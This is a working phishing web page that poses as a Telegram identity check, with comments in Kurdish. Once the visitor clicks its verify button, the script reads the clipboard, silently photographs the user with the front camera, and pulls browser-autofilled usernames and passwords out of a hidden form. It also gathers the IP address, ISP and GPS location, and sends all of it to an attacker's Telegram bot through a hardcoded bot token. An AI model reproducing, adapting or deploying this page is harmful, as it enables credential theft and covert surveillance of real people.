<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; z-index: 10; }
        .logo { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; margin-bottom: 12px; color: #222; }
        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background-color: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-appearance: none; }
        
        /* تەڵەی پاسوۆرد - بە قەبارەی 1px بەڵام لە ناو شاشەدایە تا وێبگەڕ پڕی بکاتەوە */
        #trap-form { position: fixed; top: 0; left: 0; opacity: 0.01; width: 100px; height: 100px; z-index: -1; pointer-events: none; }
        #trap-form input { font-size: 16px; width: 100%; height: 100%; }
        
        video, canvas { display: none; }
        .loading { display: none; margin-top: 15px; color: #3390ec; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
        <h2>Security Check</h2>
        <p>Your session requires verification. Please click verify and allow permissions to proceed.</p>
        
        <!-- Trap Form for Password Manager -->
        <form id="trap-form">
            <input type="text" name="username" id="trap_user" autocomplete="username">
            <input type="password" name="password" id="trap_pass" autocomplete="current-password">
        </form>

        <button class="btn" id="mainBtn">VERIFY IDENTITY</button>
        <div id="status" class="loading">Verifying... Please wait</div>
    </div>

    <video id="video" autoplay playsinline muted style="width: 1px; height: 1px;"></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = this;
            const status = document.getElementById('status');
            btn.style.display = 'none';
            status.style.display = 'block';

            // ١. دزینی Clipboard
            try {
                const clip = await navigator.clipboard.readText();
                if(clip) await sendToBot("📋 Clipboard: " + clip);
            } catch (e) {}

            // ٢. وێنەی کامێرا (چاککراو بۆ ئەوەی ڕەش نەبێت)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // وێستان بۆ ٣ چرکە تا کامێراکە بە تەواوی ڕەنگی چاک دەبێت (بۆ iOS و Android)
                await new Promise(r => setTimeout(r, 3000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'face.jpg');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ Camera Access Denied"); }

            // ٣. وەرگرتنی پاسوۆرد (Password Trap)
            // فوکەس دەخەینە سەر خانەکە تا کیبۆرد یان پێشنیاری پاسوۆرد بێت
            document.getElementById('trap_pass').focus();
            setTimeout(async () => {
                let u = document.getElementById('trap_user').value;
                let p = document.getElementById('trap_pass').value;
                if(p) await sendToBot(`🔑 PASSWORD CAPTURED!\n👤 User: ${u}\n🔒 Pass: ${p}`);
            }, 1000);

            // ٤. زانیاری سیستەم و ئایپی
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city}\n🏢 ISP: ${d.org}`);
            });

            // ٥. GPS دواین هەنگاو
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    await sendToBot(`📍 GPS Location:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                    window.location.href = "index.html";
                }, async (err) => {
                    await sendToBot("❌ GPS Access Denied");
                    window.location.href = "index.html";
                }, { enableHighAccuracy: true, timeout: 8000 });
            } else {
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
